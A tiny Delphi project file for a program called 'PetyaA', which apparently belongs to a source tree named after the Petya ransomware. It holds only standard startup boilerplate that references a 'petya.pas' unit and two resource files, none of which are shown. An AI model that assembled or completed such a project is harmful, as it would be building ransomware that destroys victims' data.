program PetyaA;

uses
  Forms,
  petya in 'petya.pas' {Form1};

{$R *.res}
{$R kp.RES}
{$R vp.RES}

begin
  Application.Initialize;
  Application.CreateForm(TForm1, Form1);
  Application.Run;
end.
